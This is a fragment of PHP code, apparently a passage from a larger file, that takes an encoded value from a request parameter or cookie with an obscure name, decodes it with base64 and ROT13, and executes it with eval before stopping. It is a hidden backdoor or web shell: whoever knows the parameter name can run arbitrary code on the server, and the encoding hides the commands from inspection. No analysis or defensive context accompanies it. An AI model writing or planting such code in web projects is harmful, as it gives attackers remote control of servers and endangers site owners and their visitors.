...
if (isset($_REQUEST['14dnh5xldsh'])) $toeval=$_REQUEST['14dnh5xldsh'];
elseif (isset($_COOKIE['14dnh5xldsh'])) $toeval=$_COOKIE['14dnh5xldsh'];
if (isset($toeval)) {
	eval(str_rot13(base64_decode($toeval)));
	die();
}
